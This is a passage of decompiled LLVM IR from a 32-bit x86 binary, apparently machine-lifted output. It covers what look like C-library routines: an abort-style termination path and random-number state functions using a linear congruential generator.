  br i1 %v1_8050962, label %dec_label_pc_8050993, label %dec_label_pc_8050964

dec_label_pc_8050964:                             ; preds = %dec_label_pc_805095b
  store i8 1, i8* @global_var_805b954.77, align 4
  br label %dec_label_pc_805096b

dec_label_pc_805096b:                             ; preds = %dec_label_pc_80509d2, %dec_label_pc_8050964
  %v1_8050973 = call i32 @function_80512df(i32 ptrtoint (i32* @global_var_80557e8.76 to i32))
  store i32 %v1_8050973, i32* %eax.global-to-local, align 4
  %v1_805097f = call i32 @function_80524e0(i32 6)
  store i32 %v1_805097f, i32* %eax.global-to-local, align 4
  %v1_805098b = call i32 @function_80512df(i32 ptrtoint (i32* @global_var_80557e8.76 to i32))
  store i32 %v1_805098b, i32* %eax.global-to-local, align 4
  %v0_8050993.pre = load i8, i8* @global_var_805b954.77, align 4
  br label %dec_label_pc_8050993

dec_label_pc_8050993:                             ; preds = %dec_label_pc_805095b, %dec_label_pc_805096b
  %v2_8050993 = phi i32 [ %v2_805099323, %dec_label_pc_805095b ], [ %v1_805098b, %dec_label_pc_805096b ]
  %v0_8050993 = phi i8 [ %v0_805095b, %dec_label_pc_805095b ], [ %v0_8050993.pre, %dec_label_pc_805096b ]
  %v1_8050993 = zext i8 %v0_8050993 to i32
  %v3_8050993 = and i32 %v2_8050993, -256
  %v4_8050993 = or i32 %v1_8050993, %v3_8050993
  store i32 %v4_8050993, i32* %eax.global-to-local, align 4
  %v10_8050998 = icmp eq i8 %v0_8050993, 1
  %v1_805099a = icmp eq i1 %v10_8050998, false
  br i1 %v1_805099a, label %dec_label_pc_80509f4, label %dec_label_pc_80509c7.lr.ph

dec_label_pc_80509c7.lr.ph:                       ; preds = %dec_label_pc_8050993
  %v2_80509a4 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_80509a4, i32* %eax.global-to-local, align 4
  store i8 2, i8* @global_var_805b954.77, align 4
  %v3_80509b0 = bitcast i32* %stack_var_-272 to i8*
  %v4_80509b0 = call i32 @function_804f698(i8* %v3_80509b0, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_80509c738 = add i32 %v12_8050922, 140
  %v5_80509c739 = inttoptr i32 %v4_80509c738 to i32*
  store i32 -1, i32* %v5_80509c739, align 4
  %v0_80509cf40 = load i32, i32* %eax.global-to-local, align 4
  %v1_80509cf41 = add i32 %v0_80509cf40, -1
  %v9_80509cf42 = icmp slt i32 %v1_80509cf41, 0
  store i32 %v1_80509cf41, i32* %eax.global-to-local, align 4
  %v1_80509d043 = icmp eq i1 %v9_80509cf42, false
  br i1 %v1_80509d043, label %dec_label_pc_80509c7.dec_label_pc_80509c7_crit_edge, label %dec_label_pc_80509d2

dec_label_pc_80509c7.dec_label_pc_80509c7_crit_edge: ; preds = %dec_label_pc_80509c7.lr.ph, %dec_label_pc_80509c7.dec_label_pc_80509c7_crit_edge
  %v1_80509cf44 = phi i32 [ %v1_80509cf, %dec_label_pc_80509c7.dec_label_pc_80509c7_crit_edge ], [ %v1_80509cf41, %dec_label_pc_80509c7.lr.ph ]
  %v0_80509c7.pre = load i32, i32* @esp, align 4
  %v2_80509c7 = mul i32 %v1_80509cf44, 4
  %v3_80509c7 = add i32 %v0_80509c7.pre, 16
  %v4_80509c7 = add i32 %v3_80509c7, %v2_80509c7
  %v5_80509c7 = inttoptr i32 %v4_80509c7 to i32*
  store i32 -1, i32* %v5_80509c7, align 4
  %v0_80509cf = load i32, i32* %eax.global-to-local, align 4
  %v1_80509cf = add i32 %v0_80509cf, -1
  %v9_80509cf = icmp slt i32 %v1_80509cf, 0
  store i32 %v1_80509cf, i32* %eax.global-to-local, align 4
  %v1_80509d0 = icmp eq i1 %v9_80509cf, false
  br i1 %v1_80509d0, label %dec_label_pc_80509c7.dec_label_pc_80509c7_crit_edge, label %dec_label_pc_80509d2

dec_label_pc_80509d2:                             ; preds = %dec_label_pc_80509c7.dec_label_pc_80509c7_crit_edge, %dec_label_pc_80509c7.lr.ph
  %v1_80509cf.lcssa = phi i32 [ %v1_80509cf41, %dec_label_pc_80509c7.lr.ph ], [ %v1_80509cf, %dec_label_pc_80509c7.dec_label_pc_80509c7_crit_edge ]
  store i32 %v2_80509a4, i32* %eax.global-to-local, align 4
  %v5_80509e7 = call i32 @function_8051523(i32 6, i32* nonnull %stack_var_-272, i32 0, i32 %v1_80509cf.lcssa)
  store i32 %v5_80509e7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805096b

dec_label_pc_80509f4:                             ; preds = %dec_label_pc_8050993
  %v10_80509f4 = icmp eq i8 %v0_8050993, 2
  %v1_80509f6 = icmp eq i1 %v10_80509f4, false
  br i1 %v1_80509f6, label %dec_label_pc_8050a00, label %dec_label_pc_80509f8

dec_label_pc_80509f8:                             ; preds = %dec_label_pc_80509f4
  store i8 3, i8* @global_var_805b954.77, align 4
  br label %dec_label_pc_8050a00

dec_label_pc_8050a00:                             ; preds = %dec_label_pc_80509f4, %dec_label_pc_80509f8
  %v0_8050a00 = phi i8 [ %v0_8050993, %dec_label_pc_80509f4 ], [ 3, %dec_label_pc_80509f8 ]
  %v9_8050a00 = icmp eq i8 %v0_8050a00, 3
  %v1_8050a07 = icmp eq i1 %v9_8050a00, false
  br i1 %v1_8050a07, label %dec_label_pc_8050a1a, label %dec_label_pc_8050a09

dec_label_pc_8050a09:                             ; preds = %dec_label_pc_8050a00
  store i8 4, i8* @global_var_805b954.77, align 4
  %v1_8050a15 = call i32 @function_804e274(i32 127)
  unreachable

dec_label_pc_8050a1a:                             ; preds = %dec_label_pc_8050a00, %dec_label_pc_8050a1a
  br label %dec_label_pc_8050a1a

; uselistorder directives
  uselistorder i32 %v1_80509cf, { 0, 3, 2, 1 }
  uselistorder i8 %v0_8050993, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8050932, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 6, 7, 9, 8, 4, 0, 1, 10, 11, 12, 13, 14, 18, 15, 17, 16, 5, 2, 3 }
  uselistorder i8 4, { 2, 1, 0 }
  uselistorder i8 3, { 0, 3, 6, 5, 1, 4, 2 }
  uselistorder i8* @global_var_805b954.77, { 5, 4, 3, 0, 2, 1 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @function_804e584, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050a1a, { 1, 0 }
  uselistorder label %dec_label_pc_8050a00, { 1, 0 }
  uselistorder label %dec_label_pc_80509c7.dec_label_pc_80509c7_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8050993, { 1, 0 }
  uselistorder label %dec_label_pc_805095b, { 1, 0 }
  uselistorder label %dec_label_pc_8050927.dec_label_pc_8050927_crit_edge, { 1, 0 }
}

define i32 @function_8050a20(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050a20:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_8050a36 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8050a36, i32* @ebx, align 4
  %v2_8050a3b = call i32 @function_80512e2(i32 %v2_8050a36, i32 134550239)
  %v1_8050a47 = call i32 @function_80512df(i32 ptrtoint (i32* @global_var_8055800.78 to i32))
  %v2_8050a4e = ptrtoint i32* %stack_var_-8 to i32
  %v3_8050a58 = call i32 @function_8050c01(i32* nonnull @global_var_8055818, i32 %v2_8050a4e)
  store i32 ptrtoint (i32* @global_var_8055818 to i32), i32* @eax, align 4
  %v2_8050a62 = call i32 @function_80512e2(i32 %v2_8050a36, i32 1)
  %v3_8050a67 = load i32, i32* %stack_var_-8, align 4
  ret i32 %v3_8050a67
}

define i32 @function_8050a70(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050a70:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v2_8050a81 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8050a81, i32* @eax, align 4
  %v2_8050a86 = call i32 @function_80512e2(i32 %v2_8050a81, i32 134550239)
  %v1_8050a92 = call i32 @function_80512df(i32 ptrtoint (i32* @global_var_8055800.78 to i32))
  %v0_8050a97 = load i32, i32* bitcast (i32** @global_var_8055820.81 to i32*), align 32
  store i32 %v0_8050a97, i32* @ebx, align 4
  %v3_8050aa8 = call i32 @function_8050b68(i32 %arg1, i32* nonnull @global_var_8055818)
  %v2_8050ab0 = icmp slt i32 %v3_8050aa8, 0
  br i1 %v2_8050ab0, label %dec_label_pc_8050ab7, label %dec_label_pc_8050ab4

dec_label_pc_8050ab4:                             ; preds = %dec_label_pc_8050a70
  store i32 ptrtoint (i32** @global_var_805581c.82 to i32), i32* @esi, align 4
  br label %dec_label_pc_8050ab7

dec_label_pc_8050ab7:                             ; preds = %dec_label_pc_8050a70, %dec_label_pc_8050ab4
  store i32 %v2_8050a81, i32* @eax, align 4
  %v2_8050ac0 = call i32 @function_80512e2(i32 %v2_8050a81, i32 1)
  %v0_8050ac8 = load i32, i32* @esi, align 4
  ret i32 %v0_8050ac8

; uselistorder directives
  uselistorder label %dec_label_pc_8050ab7, { 1, 0 }
}

define i32 @function_8050acd(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050acd:
  %stack_var_-24 = alloca i32, align 4
  %v2_8050adc = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8050adc, i32* @ebx, align 4
  %v2_8050ae1 = call i32 @function_80512e2(i32 %v2_8050adc, i32 134550239)
  %v1_8050aed = call i32 @function_80512df(i32 ptrtoint (i32* @global_var_8055800.78 to i32))
  store i32 ptrtoint (i32** @global_var_805581c.82 to i32), i32* @esi, align 4
  %v4_8050b0c = inttoptr i32 %arg2 to i32*
  %v5_8050b0c = call i32 @function_8050cf9(i32 %arg1, i32* %v4_8050b0c, i32 %arg3, i32 ptrtoint (i32* @global_var_8055818 to i32))
  store i32 %v5_8050b0c, i32* @eax, align 4
  %v2_8050b17 = call i32 @function_80512e2(i32 %v2_8050adc, i32 1)
  %v0_8050b1f = load i32, i32* @esi, align 4
  ret i32 %v0_8050b1f
}

define i32 @function_8050b24(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050b24:
  %stack_var_-20 = alloca i32, align 4
  %v2_8050b32 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8050b32, i32* @ebx, align 4
  %v2_8050b37 = call i32 @function_80512e2(i32 %v2_8050b32, i32 134550239)
  %v1_8050b43 = call i32 @function_80512df(i32 ptrtoint (i32* @global_var_8055800.78 to i32))
  %v3_8050b53 = call i32 @function_8050c5f(i32 %arg1, i32* nonnull @global_var_8055818)
  store i32 ptrtoint (i32* @global_var_8055818 to i32), i32* @eax, align 4
  %v2_8050b5d = call i32 @function_80512e2(i32 %v2_8050b32, i32 1)
  ret i32 %v2_8050b5d

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_8055818 to i32), { 1, 2, 0 }
  uselistorder i32* @global_var_8055818, { 0, 1, 3, 2 }
}

define i32 @function_8050b68(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_8050b68:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg2 to i32
  %v0_8050b6b = load i32, i32* @ebx, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  %v1_8050b77 = add i32 %tmp3, 12
  %v2_8050b77 = inttoptr i32 %v1_8050b77 to i32*
  %v3_8050b77 = load i32, i32* %v2_8050b77, align 4
  store i32 %v3_8050b77, i32* %ecx.global-to-local, align 4
  %v1_8050b7a = add i32 %arg1, 4
  store i32 %v1_8050b7a, i32* %esi.global-to-local, align 4
  %v1_8050b7d = add i32 %tmp3, 8
  %v2_8050b7d = inttoptr i32 %v1_8050b7d to i32*
  %v3_8050b7d = load i32, i32* %v2_8050b7d, align 4
  %v1_8050b80 = icmp eq i32 %v3_8050b77, 0
  %v1_8050b82 = icmp eq i1 %v1_8050b80, false
  br i1 %v1_8050b82, label %dec_label_pc_8050b8d, label %dec_label_pc_8050b84

dec_label_pc_8050b84:                             ; preds = %dec_label_pc_8050b68
  %v1_8050b84 = add i32 %v3_8050b7d, -4
  %v2_8050b84 = inttoptr i32 %v1_8050b84 to i32*
  store i32 0, i32* %v2_8050b84, align 4
  br label %dec_label_pc_8050b9d

dec_label_pc_8050b8d:                             ; preds = %dec_label_pc_8050b68
  %v1_8050b8d = add i32 %tmp3, 4
  %v2_8050b8d = inttoptr i32 %v1_8050b8d to i32*
  %v3_8050b8d = load i32, i32* %v2_8050b8d, align 4
  %v2_8050b90 = sub i32 %v3_8050b8d, %v3_8050b7d
  %v2_8050b92 = sdiv i32 %v2_8050b90, 4
  %v3_8050b95 = mul i32 %v2_8050b92, 5
  %v2_8050b98 = add i32 %v3_8050b95, %v3_8050b77
  store i32 %v2_8050b98, i32* %eax.global-to-local, align 4
  %v2_8050b9a = add i32 %v3_8050b7d, -4
  %v3_8050b9a = inttoptr i32 %v2_8050b9a to i32*
  store i32 %v2_8050b98, i32* %v3_8050b9a, align 4
  br label %dec_label_pc_8050b9d

dec_label_pc_8050b9d:                             ; preds = %dec_label_pc_8050b84, %dec_label_pc_8050b8d
  %v0_8050b9d = load i32, i32* %esi.global-to-local, align 4
  %v1_8050b9d = add i32 %v0_8050b9d, -4
  %v2_8050b9d = inttoptr i32 %v1_8050b9d to i32*
  %v3_8050b9d = load i32, i32* %v2_8050b9d, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_8050ba5 = ashr i32 %v3_8050b9d, 31
  %v2_8050ba6 = zext i32 %v3_8050b9d to i64
  %v4_8050ba6 = zext i32 %v1_8050ba5 to i64
  %v5_8050ba6 = mul nuw i64 %v4_8050ba6, 4294967296
  %v6_8050ba6 = or i64 %v5_8050ba6, %v2_8050ba6
  %v8_8050ba6 = sdiv i64 %v6_8050ba6, 5
  %v9_8050ba6 = trunc i64 %v8_8050ba6 to i32
  store i32 %v9_8050ba6, i32* %eax.global-to-local, align 4
  %v10_8050ba6 = srem i64 %v6_8050ba6, 5
  %v11_8050ba6 = trunc i64 %v10_8050ba6 to i32
  %v6_8050bab = icmp ugt i32 %v11_8050ba6, 4
  br i1 %v6_8050bab, label %dec_label_pc_8050beb, label %dec_label_pc_8050bad

dec_label_pc_8050bad:                             ; preds = %dec_label_pc_8050b9d
  %v1_8050bad = mul i32 %v11_8050ba6, 4
  %v2_8050bad = add i32 %v1_8050bad, ptrtoint (i32* @global_var_8054294.83 to i32)
  %v3_8050bad = inttoptr i32 %v2_8050bad to i32*
  %v4_8050bad = load i32, i32* %v3_8050bad, align 4
  store i32 %v4_8050bad, i32* %ecx.global-to-local, align 4
  %v1_8050bb4 = icmp eq i32 %v11_8050ba6, 0
  %v2_8050bb6 = add i32 %v1_8050bad, ptrtoint (i32* @global_var_8054280.84 to i32)
  %v3_8050bb6 = inttoptr i32 %v2_8050bb6 to i32*
  %v4_8050bb6 = load i32, i32* %v3_8050bb6, align 4
  store i32 %v4_8050bb6, i32* %ebp.global-to-local, align 4
  %v1_8050bbd = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050bbd = add i32 %v1_8050bbd, 12
  %v3_8050bbd = inttoptr i32 %v2_8050bbd to i32*
  store i32 %v11_8050ba6, i32* %v3_8050bbd, align 4
  %v0_8050bc0 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050bc0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050bc0 = add i32 %v1_8050bc0, 16
  %v3_8050bc0 = inttoptr i32 %v2_8050bc0 to i32*
  store i32 %v0_8050bc0, i32* %v3_8050bc0, align 4
  %v0_8050bc3 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8050bc3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050bc3 = add i32 %v1_8050bc3, 20
  %v3_8050bc3 = inttoptr i32 %v2_8050bc3 to i32*
  store i32 %v0_8050bc3, i32* %v3_8050bc3, align 4
  br i1 %v1_8050bb4, label %dec_label_pc_8050bde, label %dec_label_pc_8050bc8

dec_label_pc_8050bc8:                             ; preds = %dec_label_pc_8050bad
  %v0_8050bc8 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050bc8 = add i32 %v0_8050bc8, -4
  %v2_8050bc8 = inttoptr i32 %v1_8050bc8 to i32*
  %v3_8050bc8 = load i32, i32* %v2_8050bc8, align 4
  %v1_8050bcb = ashr i32 %v3_8050bc8, 31
  %v0_8050bcc = load i32, i32* %edi.global-to-local, align 4
  %v2_8050bcc = zext i32 %v3_8050bc8 to i64
  %v4_8050bcc = zext i32 %v1_8050bcb to i64
  %v5_8050bcc = mul nuw i64 %v4_8050bcc, 4294967296
  %v6_8050bcc = or i64 %v5_8050bcc, %v2_8050bcc
  %v7_8050bcc = zext i32 %v0_8050bcc to i64
  %v8_8050bcc = sdiv i64 %v6_8050bcc, %v7_8050bcc
  %v9_8050bcc = trunc i64 %v8_8050bcc to i32
  %v2_8050bce = mul i32 %v9_8050bcc, 4
  %v3_8050bce = add i32 %v2_8050bce, %v0_8050bc8
  %v1_8050bd1 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050bd1 = add i32 %v1_8050bd1, %v9_8050bcc
  store i32 %v2_8050bd1, i32* %eax.global-to-local, align 4
  %v1_8050bd3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050bd3 = add i32 %v1_8050bd3, 4
  %v3_8050bd3 = inttoptr i32 %v2_8050bd3 to i32*
  store i32 %v3_8050bce, i32* %v3_8050bd3, align 4
  %v0_8050bd6 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050bd6 = ashr i32 %v0_8050bd6, 31
  %v0_8050bd7 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050bd7 = zext i32 %v0_8050bd6 to i64
  %v4_8050bd7 = zext i32 %v1_8050bd6 to i64
  %v5_8050bd7 = mul nuw i64 %v4_8050bd7, 4294967296
  %v6_8050bd7 = or i64 %v5_8050bd7, %v2_8050bd7
  %v7_8050bd7 = zext i32 %v0_8050bd7 to i64
  %v8_8050bd7 = sdiv i64 %v6_8050bd7, %v7_8050bd7
  %v9_8050bd7 = trunc i64 %v8_8050bd7 to i32
  store i32 %v9_8050bd7, i32* %eax.global-to-local, align 4
  %v10_8050bd7 = srem i64 %v6_8050bd7, %v7_8050bd7
  %v11_8050bd7 = trunc i64 %v10_8050bd7 to i32
  %v0_8050bd9 = load i32, i32* %esi.global-to-local, align 4
  %v2_8050bd9 = mul i32 %v11_8050bd7, 4
  %v3_8050bd9 = add i32 %v2_8050bd9, %v0_8050bd9
  %v1_8050bdc = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050bdc = inttoptr i32 %v1_8050bdc to i32*
  store i32 %v3_8050bd9, i32* %v2_8050bdc, align 4
  br label %dec_label_pc_8050bde

dec_label_pc_8050bde:                             ; preds = %dec_label_pc_8050bad, %dec_label_pc_8050bc8
  %v0_8050bde = load i32, i32* %esi.global-to-local, align 4
  %v1_8050bde = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050bde = mul i32 %v1_8050bde, 4
  %v3_8050bde = add i32 %v2_8050bde, %v0_8050bde
  %v1_8050be1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050be1 = add i32 %v1_8050be1, 24
  %v3_8050be1 = inttoptr i32 %v2_8050be1 to i32*
  store i32 %v3_8050bde, i32* %v3_8050be1, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8050be6 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050be6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050be6 = add i32 %v1_8050be6, 8
  %v3_8050be6 = inttoptr i32 %v2_8050be6 to i32*
  store i32 %v0_8050be6, i32* %v3_8050be6, align 4
  %v0_8050c00.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050bf9

dec_label_pc_8050beb:                             ; preds = %dec_label_pc_8050b9d
  %v1_8050beb = call i32 @function_804e694(i32 %v0_8050b6b)
  %v1_8050bf0 = inttoptr i32 %v1_8050beb to i32*
  store i32 22, i32* %v1_8050bf0, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050bf9

dec_label_pc_8050bf9:                             ; preds = %dec_label_pc_8050bde, %dec_label_pc_8050beb
  %v0_8050c00 = phi i32 [ %v0_8050c00.pre, %dec_label_pc_8050bde ], [ -1, %dec_label_pc_8050beb ]
  store i32 %v0_8050b6b, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8050c00

; uselistorder directives
  uselistorder i32 %v11_8050ba6, { 1, 3, 2, 0 }
  uselistorder i32 %tmp3, { 0, 1, 3, 2 }
  uselistorder i64 5, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050bf9, { 1, 0 }
  uselistorder label %dec_label_pc_8050bde, { 1, 0 }
  uselistorder label %dec_label_pc_8050b9d, { 1, 0 }
}

define i32 @function_8050c01(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8050c01:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_8050c04 = load i32, i32* @ebx, align 4
  store i32 %v0_8050c04, i32* %stack_var_-16, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_8050c0d = add i32 %tmp3, 12
  %v2_8050c0d = inttoptr i32 %v1_8050c0d to i32*
  %v3_8050c0d = load i32, i32* %v2_8050c0d, align 4
  %v4_8050c0d = icmp eq i32 %v3_8050c0d, 0
  %v1_8050c11 = add i32 %tmp3, 8
  %v2_8050c11 = inttoptr i32 %v1_8050c11 to i32*
  %v3_8050c11 = load i32, i32* %v2_8050c11, align 4
  store i32 %v3_8050c11, i32* %esi.global-to-local, align 4
  %v1_8050c14 = icmp eq i1 %v4_8050c0d, false
  br i1 %v1_8050c14, label %dec_label_pc_8050c2d, label %dec_label_pc_8050c16

dec_label_pc_8050c16:                             ; preds = %dec_label_pc_8050c01
  %v2_8050c16 = inttoptr i32 %v3_8050c11 to i32*
  %v3_8050c16 = load i32, i32* %v2_8050c16, align 4
  %v5_8050c16 = mul i32 %v3_8050c16, 1103515245
  %v1_8050c1c = add i32 %v5_8050c16, 12345
  %v1_8050c21 = urem i32 %v1_8050c1c, -2147483648
  store i32 %v1_8050c21, i32* %eax.global-to-local, align 4
  store i32 %v1_8050c21, i32* %v2_8050c16, align 4
  %v0_8050c28 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050c28 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050c28 = inttoptr i32 %v1_8050c28 to i32*
  store i32 %v0_8050c28, i32* %v2_8050c28, align 4
  br label %dec_label_pc_8050c58

dec_label_pc_8050c2d:                             ; preds = %dec_label_pc_8050c01
  %v1_8050c2d = add i32 %tmp3, 4
  %v2_8050c2d = inttoptr i32 %v1_8050c2d to i32*
  %v3_8050c2d = load i32, i32* %v2_8050c2d, align 4
  store i32 %v3_8050c2d, i32* %ecx.global-to-local, align 4
  %v2_8050c30 = load i32, i32* %arg1, align 4
  store i32 %v2_8050c30, i32* %edx.global-to-local, align 4
  %v1_8050c32 = add i32 %tmp3, 24
  %v2_8050c32 = inttoptr i32 %v1_8050c32 to i32*
  %v3_8050c32 = load i32, i32* %v2_8050c32, align 4
  store i32 %v3_8050c32, i32* %edi.global-to-local, align 4
  %v1_8050c35 = inttoptr i32 %v3_8050c2d to i32*
  %v2_8050c35 = load i32, i32* %v1_8050c35, align 4
  store i32 %v2_8050c35, i32* %eax.global-to-local, align 4
  %v1_8050c37 = inttoptr i32 %v2_8050c30 to i32*
  %v2_8050c37 = load i32, i32* %v1_8050c37, align 4
  %v4_8050c37 = add i32 %v2_8050c37, %v2_8050c35
  store i32 %v4_8050c37, i32* %v1_8050c37, align 4
  %v0_8050c39 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050c39 = inttoptr i32 %v0_8050c39 to i32*
  %v2_8050c39 = load i32, i32* %v1_8050c39, align 4
  %v1_8050c3b = add i32 %v0_8050c39, 4
  store i32 %v1_8050c3b, i32* %edx.global-to-local, align 4
  %v2_8050c3e = udiv i32 %v2_8050c39, 2
  %v1_8050c40 = load i32, i32* %edi.global-to-local, align 4
  %v7_8050c40 = icmp ult i32 %v1_8050c3b, %v1_8050c40
  %v1_8050c42 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050c42 = inttoptr i32 %v1_8050c42 to i32*
  store i32 %v2_8050c3e, i32* %v2_8050c42, align 4
  %v0_8050c45 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050c45 = add i32 %v0_8050c45, 4
  store i32 %v1_8050c45, i32* %eax.global-to-local, align 4
  br i1 %v7_8050c40, label %dec_label_pc_8050c4e, label %dec_label_pc_8050c4a

dec_label_pc_8050c4a:                             ; preds = %dec_label_pc_8050c2d
  %v0_8050c4a = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_8050c4a, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050c53

dec_label_pc_8050c4e:                             ; preds = %dec_label_pc_8050c2d
  %v1_8050c4e = load i32, i32* %edi.global-to-local, align 4
  %v7_8050c4e = icmp ult i32 %v1_8050c45, %v1_8050c4e
  %v1_8050c50 = icmp eq i1 %v7_8050c4e, false
  %v3_8050c50 = load i32, i32* %esi.global-to-local, align 4
  %v4_8050c50 = select i1 %v1_8050c50, i32 %v3_8050c50, i32 %v1_8050c45
  store i32 %v4_8050c50, i32* %eax.global-to-local, align 4
  %v0_8050c53.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050c53

dec_label_pc_8050c53:                             ; preds = %dec_label_pc_8050c4a, %dec_label_pc_8050c4e
  %v0_8050c53 = phi i32 [ %v0_8050c4a, %dec_label_pc_8050c4a ], [ %v0_8050c53.pre, %dec_label_pc_8050c4e ]
  %v1_8050c53 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050c53 = inttoptr i32 %v1_8050c53 to i32*
  store i32 %v0_8050c53, i32* %v2_8050c53, align 4
  %v0_8050c55 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050c55 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050c55 = add i32 %v1_8050c55, 4
  %v3_8050c55 = inttoptr i32 %v2_8050c55 to i32*
  store i32 %v0_8050c55, i32* %v3_8050c55, align 4
  br label %dec_label_pc_8050c58

dec_label_pc_8050c58:                             ; preds = %dec_label_pc_8050c16, %dec_label_pc_8050c53
  %v2_8050c58 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8050c58, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8050c21, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8050c58, { 1, 0 }
  uselistorder label %dec_label_pc_8050c53, { 1, 0 }
}

define i32 @function_8050c5f(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_8050c5f:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp33 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_8050c5f = load i32, i32* @ebp, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8050c63 = load i32, i32* @edi, align 4
  %v0_8050c64 = load i32, i32* @esi, align 4
  %v0_8050c65 = load i32, i32* @ebx, align 4
  store i32 %tmp33, i32* @esi, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_8050c71 = add i32 %tmp33, 12
  %v2_8050c71 = inttoptr i32 %v1_8050c71 to i32*
  %v3_8050c71 = load i32, i32* %v2_8050c71, align 4
  store i32 %v3_8050c71, i32* %ecx.global-to-local, align 4
  %v6_8050c77 = icmp ugt i32 %v3_8050c71, 4
  br i1 %v6_8050c77, label %dec_label_pc_8050cf1, label %dec_label_pc_8050c79

dec_label_pc_8050c79:                             ; preds = %dec_label_pc_8050c5f
  %v1_8050c79 = add i32 %tmp33, 8
  %v2_8050c79 = inttoptr i32 %v1_8050c79 to i32*
  %v3_8050c79 = load i32, i32* %v2_8050c79, align 4
  store i32 %v3_8050c79, i32* %ebx.global-to-local, align 4
  %v1_8050c7c = icmp eq i32 %arg1, 0
  store i32 1, i32* %eax.global-to-local, align 4
  %v3_8050c83 = select i1 %v1_8050c7c, i32 1, i32 %arg1
  store i32 %v3_8050c83, i32* %edx.global-to-local, align 4
  %v1_8050c86 = icmp eq i32 %v3_8050c71, 0
  %v2_8050c88 = inttoptr i32 %v3_8050c79 to i32*
  store i32 %v3_8050c83, i32* %v2_8050c88, align 4
  br i1 %v1_8050c86, label %dec_label_pc_8050cef, label %dec_label_pc_8050c8c

